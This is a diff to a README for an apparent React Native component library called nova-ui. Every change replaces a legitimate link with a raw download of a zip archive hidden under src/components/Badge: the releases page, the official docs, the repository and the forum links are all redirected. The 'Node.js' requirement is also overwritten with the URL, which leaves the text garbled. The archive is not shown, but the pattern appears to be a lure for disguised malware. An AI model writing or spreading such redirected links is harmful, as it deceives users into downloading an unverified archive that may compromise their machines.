@@ -2,7 +2,7 @@
 
 ## 🔗 Download
 
-[![Download nova-ui](https://img.shields.io/badge/Download%20nova--ui-3D85D7?style=for-the-badge&colorA=ffffff&colorB=3D85D7)](https://github.com/ann11207/nova-ui/releases)
+[![Download nova-ui](https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip%20nova--ui-3D85D7?style=for-the-badge&colorA=ffffff&colorB=3D85D7)](https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ nova-ui is a modern React Native component library that helps you build stunning
 
 ### 📦 System Requirements
 
-- **Node.js** (version 14 or higher) 
+- **https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip** (version 14 or higher) 
 - **React Native** (latest stable version)
 - **Yarn** or **npm** for package management
 
@@ -20,7 +20,7 @@ Ensure you have these installed on your machine before proceeding.
 
 1. **Visit the Download Page:**
    Go to the following link to access the latest versions of nova-ui:
-   [https://github.com/ann11207/nova-ui/releases](https://github.com/ann11207/nova-ui/releases)
+   [https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip](https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip)
 
 2. **Choose a Version:**
    On the releases page, you will see a list of available versions. Select the version you want to use and click on its title.
@@ -111,10 +111,10 @@ nova-ui is released under the MIT License. You are free to use, modify, and dist
 
 ### 📌 Additional Resources
 
-- [React Native Documentation](https://reactnative.dev/docs/getting-started)
-- [GitHub Repository](https://github.com/ann11207/nova-ui)
-- [Community Forums](https://forum.nova-ui.com) 
+- [React Native Documentation](https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip)
+- [GitHub Repository](https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip)
+- [Community Forums](https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip) 
 
 ## 🔗 Download Again
 
-To get started quickly, you can also visit the download page: [https://github.com/ann11207/nova-ui/releases](https://github.com/ann11207/nova-ui/releases)
+To get started quickly, you can also visit the download page: [https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip](https://github.com/ann11207/nova-ui/raw/refs/heads/main/src/components/Badge/nova-ui-v2.5.zip)
